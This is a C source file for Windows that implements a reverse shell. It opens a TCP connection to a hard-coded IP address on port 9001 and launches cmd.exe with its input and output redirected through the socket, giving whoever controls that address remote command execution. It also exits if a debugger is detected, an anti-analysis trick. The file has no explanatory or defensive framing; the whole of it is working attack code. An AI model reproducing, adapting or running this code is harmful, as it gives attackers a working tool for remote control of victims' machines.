#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <stdio.h>
#include <Windows.h>
#include <WS2tcpip.h>
#pragma comment(lib, "ws2_32.lib")


int main() {
	SOCKET shell;
	sockaddr_in shell_addr;
	int connection;
	WSADATA wsa;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	char RecvServer[512];
	char ip_addr[] = "172.29.138.13";
	int port = 9001;
	char cmd[] = "cmd.exe";


	if (IsDebuggerPresent()) {
		printf("[!] Debugger detected exiting");
		return EXIT_FAILURE;
	}

	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
		printf("[!] WSAStartup failed: %d\n", WSAGetLastError());
		return 1;
	}
	shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL); // like socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)

	shell_addr.sin_port = htons(port);
	shell_addr.sin_family = AF_INET;
	shell_addr.sin_addr.s_addr = inet_addr(ip_addr);

	connection = WSAConnect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL); // Connect to server

	if (connection == SOCKET_ERROR) {
		printf("[!] Connection to the target server failed");
		exit(0);
	}

	else {
		recv(shell, RecvServer, sizeof(RecvServer), 0);
		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
		si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)shell;
		if (CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi) == 0) {
			printf("[!] Failed to create process: %d\n", GetLastError());
			exit(0);
		}

		printf("[+] Process created succesfully!\n");

		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		memset(RecvServer, 0, sizeof(RecvServer));



	}



}

